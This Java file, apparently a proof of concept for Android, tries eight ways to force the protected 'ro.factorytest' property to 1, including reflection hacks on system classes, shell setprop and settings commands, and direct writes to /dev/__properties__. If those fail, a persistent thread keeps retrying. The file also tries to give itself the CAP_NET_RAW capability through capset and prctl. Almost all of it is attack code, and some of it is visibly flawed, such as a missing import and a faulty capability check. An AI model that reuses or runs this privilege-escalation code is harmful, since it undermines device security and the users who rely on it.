package com.poc;

import android.os.Process;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Main {
    private static final String TARGET_PROP = "ro.factorytest";
    private static final String TARGET_VALUE = "1";
    private static final long RETRY_INTERVAL_MS = 30000;
    private static final int CAP_NET_RAW = 13;
    private static final int PR_CAP_AMBIENT = 47;
    private static final int PR_CAP_AMBIENT_RAISE = 2;
    private static final int PR_CAP_AMBIENT_IS_SET = 1;

    public static void main(String[] args) throws Exception {
        System.out.println("=== uid=" + Process.myUid() + " ===");
        System.out.println("SELinux context: " + getSelinuxContext());

        int origMode = getFactoryTestMode();
        System.out.println("[FactoryTest] Original getMode = " + origMode);
        boolean factoryOk = tryAllFactoryMethods();
        System.out.println("[FactoryTest] After attempts, getMode = " + getFactoryTestMode());
        if (!factoryOk) {
            System.out.println("[FactoryTest] Starting persistent retry thread...");
            startRetryThread();
        }

        System.out.println("\n[Capability] Reading current capabilities via reflection...");
        try {
            Class<?> osClass = Class.forName("android.system.Os");
            Class<?> headerClass = Class.forName("android.system.StructCapUserHeader");
            Class<?> dataClass = Class.forName("android.system.StructCapUserData");

            Constructor<?> headerCtor = headerClass.getConstructor(int.class, int.class);
            Object header = headerCtor.newInstance(OsConstants._LINUX_CAPABILITY_VERSION_3, 0);

            Method capget = osClass.getMethod("capget", headerClass);
            Object dataArray = capget.invoke(null, header);

            int length = java.lang.reflect.Array.getLength(dataArray);
            System.out.println("Capability data count: " + length);
            long effective = 0, permitted = 0, inheritable = 0;
            for (int i = 0; i < length && i < 2; i++) {
                Object entry = java.lang.reflect.Array.get(dataArray, i);
                Field effField = dataClass.getField("effective");
                Field permField = dataClass.getField("permitted");
                Field inhField = dataClass.getField("inheritable");
                int eff = effField.getInt(entry);
                int perm = permField.getInt(entry);
                int inh = inhField.getInt(entry);
                if (i == 0) {
                    effective |= ((long) eff) & 0xFFFFFFFFL;
                    permitted |= ((long) perm) & 0xFFFFFFFFL;
                    inheritable |= ((long) inh) & 0xFFFFFFFFL;
                } else {
                    effective |= ((long) eff) << 32;
                    permitted |= ((long) perm) << 32;
                    inheritable |= ((long) inh) << 32;
                }
            }
            System.out.println("Effective:   " + Long.toHexString(effective));
            System.out.println("Permitted:   " + Long.toHexString(permitted));
            System.out.println("Inheritable: " + Long.toHexString(inheritable));
            System.out.println("CAP_NET_RAW  effective? " + hasCap(effective, CAP_NET_RAW));

            System.out.println("[Capability] Attempting to add CAP_NET_RAW via capset...");
            Object newData = java.lang.reflect.Array.newInstance(dataClass, 2);
            for (int i = 0; i < 2; i++) {
                Object entry = java.lang.reflect.Array.get(dataArray, i);
                int eff = 0, perm = 0, inh = 0;
                if (i == 0) {
                    if (CAP_NET_RAW < 32) {
                        perm |= (1 << CAP_NET_RAW);
                        eff |= (1 << CAP_NET_RAW);
                        inh |= (1 << CAP_NET_RAW);
                    }
                } else {
                    if (CAP_NET_RAW >= 32) {
                        int bit = CAP_NET_RAW - 32;
                        perm |= (1 << bit);
                        eff |= (1 << bit);
                        inh |= (1 << bit);
                    }
                }
                Object newEntry = dataClass.getConstructor(int.class, int.class, int.class).newInstance(eff, perm, inh);
                java.lang.reflect.Array.set(newData, i, newEntry);
            }
            Method capset = osClass.getMethod("capset", headerClass, Class.forName("[Landroid.system.StructCapUserData;"));
            try {
                capset.invoke(null, header, newData);
                System.out.println("[Capability] capset succeeded (but likely not effective)");
            } catch (Exception e) {
                System.out.println("[Capability] capset failed: " + e.getCause());
            }

            System.out.println("[Capability] Trying to raise ambient capability...");
            try {
                Method prctl = osClass.getMethod("prctl", int.class, int.class, int.class, long.class, long.class);
                prctl.invoke(null, PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, CAP_NET_RAW, 0L, 0L);
                Object result = prctl.invoke(null, PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, CAP_NET_RAW, 0L, 0L);
                System.out.println("[Capability] Ambient raise result: " + result);
            } catch (Exception e) {
                System.out.println("[Capability] Ambient raise failed: " + e.getCause());
            }

            System.out.println("[Capability] Final capabilities:");
            dataArray = capget.invoke(null, header);
            effective = permitted = inheritable = 0;
            for (int i = 0; i < 2; i++) {
                Object entry = java.lang.reflect.Array.get(dataArray, i);
                Field effField = dataClass.getField("effective");
                Field permField = dataClass.getField("permitted");
                Field inhField = dataClass.getField("inheritable");
                int eff = effField.getInt(entry);
                int perm = permField.getInt(entry);
                int inh = inhField.getInt(entry);
                if (i == 0) {
                    effective |= ((long) eff) & 0xFFFFFFFFL;
                    permitted |= ((long) perm) & 0xFFFFFFFFL;
                    inheritable |= ((long) inh) & 0xFFFFFFFFL;
                } else {
                    effective |= ((long) eff) << 32;
                    permitted |= ((long) perm) << 32;
                    inheritable |= ((long) inh) << 32;
                }
            }
            System.out.println("Effective:   " + Long.toHexString(effective));
            System.out.println("Permitted:   " + Long.toHexString(permitted));
            System.out.println("Inheritable: " + Long.toHexString(inheritable));
            System.out.println("CAP_NET_RAW  effective? " + hasCap(effective, CAP_NET_RAW));

        } catch (Throwable t) {
            System.err.println("[Capability] Error: " + t);
            t.printStackTrace();
        }

        System.out.println("\n[Capability] /proc/self/status Cap info:");
        printProcCapabilities();

        while (true) {
            Thread.sleep(60000);
        }
    }

    private static int getFactoryTestMode() {
        try {
            Class<?> ft = Class.forName("android.os.FactoryTest");
            Method getMode = ft.getMethod("getMode");
            return (int) getMode.invoke(null);
        } catch (Exception e) {
            return -1;
        }
    }

    private static boolean tryAllFactoryMethods() {
        boolean ok = false;
        ok |= method1_SystemProperties_set();
        ok |= method2_RoSystemProperties_reflection();
        ok |= method3_FactoryTest_reflection();
        ok |= method4_setprop_command();
        ok |= method5_dev_properties_write();
        ok |= method6_settings_put();
        ok |= method7_persist_property();
        ok |= method8_hijack_factorytest();
        return ok;
    }

    private static boolean method1_SystemProperties_set() {
        try {
            Class<?> sp = Class.forName("android.os.SystemProperties");
            Method set = sp.getMethod("set", String.class, String.class);
            set.setAccessible(true);
            set.invoke(null, TARGET_PROP, TARGET_VALUE);
            System.out.println("[+] Method1: SystemProperties.set invoked");
            return true;
        } catch (Exception e) {
            System.out.println("[-] Method1 failed: " + e.getMessage());
            return false;
        }
    }

    private static boolean method2_RoSystemProperties_reflection() {
        try {
            Class<?> ro = Class.forName("com.android.internal.os.RoSystemProperties");
            Field field = ro.getDeclaredField("FACTORYTEST");
            field.setAccessible(true);
            Field mod = Field.class.getDeclaredField("modifiers");
            mod.setAccessible(true);
            mod.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            field.setInt(null, 1);
            System.out.println("[+] Method2: RoSystemProperties.FACTORYTEST = 1");
            return true;
        } catch (Exception e) {
            System.out.println("[-] Method2 failed: " + e.getMessage());
            return false;
        }
    }

    private static boolean method3_FactoryTest_reflection() {
        try {
            Class<?> ft = Class.forName("android.os.FactoryTest");
            for (Field f : ft.getDeclaredFields()) {
                if (f.getType() == int.class && f.getName().contains("MODE")) {
                    f.setAccessible(true);
                    f.setInt(null, 1);
                    System.out.println("[+] Method3: Set " + f.getName() + " = 1");
                    return true;
                }
            }
        } catch (Exception e) {
            System.out.println("[-] Method3 failed: " + e);
        }
        return false;
    }

    private static boolean method4_setprop_command() {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "setprop " + TARGET_PROP + " " + TARGET_VALUE});
            p.waitFor();
            if (p.exitValue() == 0) {
                System.out.println("[+] Method4: setprop succeeded");
                return true;
            }
        } catch (Exception e) {
            System.out.println("[-] Method4 failed: " + e);
        }
        return false;
    }

    private static boolean method5_dev_properties_write() {
        String[] paths = {
            "/dev/__properties__/property_info",
            "/dev/__properties__/properties_serial",
            "/dev/__properties__/u:object_r:exported_default_prop:s0"
        };
        for (String p : paths) {
            try (FileOutputStream fos = new FileOutputStream(p, true)) {
                fos.write((TARGET_PROP + "=" + TARGET_VALUE + "\n").getBytes());
                fos.flush();
                System.out.println("[+] Method5: Wrote to " + p);
                return true;
            } catch (Exception ignored) {}
        }
        System.out.println("[-] Method5 failed");
        return false;
    }

    private static boolean method6_settings_put() {
        for (String ns : new String[]{"global", "secure"}) {
            try {
                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "settings put " + ns + " factorytest 1"});
                p.waitFor();
                if (p.exitValue() == 0) {
                    System.out.println("[+] Method6: settings put " + ns + " succeeded");
                    return true;
                }
            } catch (Exception e) {
                System.out.println("[-] Method6 failed: " + e);
            }
        }
        return false;
    }

    private static boolean method7_persist_property() {
        try {
            Class<?> sp = Class.forName("android.os.SystemProperties");
            Method set = sp.getMethod("set", String.class, String.class);
            set.setAccessible(true);
            set.invoke(null, "persist.sys.factorytest", "1");
            System.out.println("[+] Method7: persist.sys.factorytest = 1");
            return true;
        } catch (Exception e) {
            System.out.println("[-] Method7 failed: " + e);
            return false;
        }
    }

    private static boolean method8_hijack_factorytest() {
        try {
            Class<?> ro = Class.forName("com.android.internal.os.RoSystemProperties");
            Field field = ro.getDeclaredField("FACTORYTEST");
            field.setAccessible(true);
            Field mod = Field.class.getDeclaredField("modifiers");
            mod.setAccessible(true);
            mod.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            field.setInt(null, 1);
            if (getFactoryTestMode() == 1) {
                System.out.println("[+] Method8: FactoryTest.getMode() now returns 1!");
                return true;
            } else {
                System.out.println("[-] Method8: FactoryTest.getMode() still " + getFactoryTestMode());
                return false;
            }
        } catch (Exception e) {
            System.out.println("[-] Method8 failed: " + e);
            return false;
        }
    }

    private static void startRetryThread() {
        Thread t = new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(RETRY_INTERVAL_MS);
                    System.out.println("[*] Retrying factorytest hijack...");
                    tryAllFactoryMethods();
                } catch (InterruptedException e) {
                    break;
                }
            }
        });
        t.setDaemon(false);
        t.start();
        System.out.println("[+] Retry thread started.");
    }

    private static boolean hasCap(long mask, int cap) {
        if (cap < 32) return (mask & (1L << cap)) != 0;
        else return (mask & (1L << (cap - 32))) != 0;
    }

    private static void printProcCapabilities() {
        try (BufferedReader r = new BufferedReader(new FileReader("/proc/self/status"))) {
            String line;
            while ((line = r.readLine()) != null) {
                if (line.startsWith("Cap")) {
                    System.out.println(line);
                }
            }
        } catch (Exception ignored) {}
    }

    private static String getSelinuxContext() {
        try (FileInputStream fis = new FileInputStream("/proc/self/attr/current")) {
            byte[] b = new byte[1024];
            int len = fis.read(b);
            if (len > 0) return new String(b, 0, len).trim();
        } catch (Exception ignored) {}
        return "unknown";
    }
}
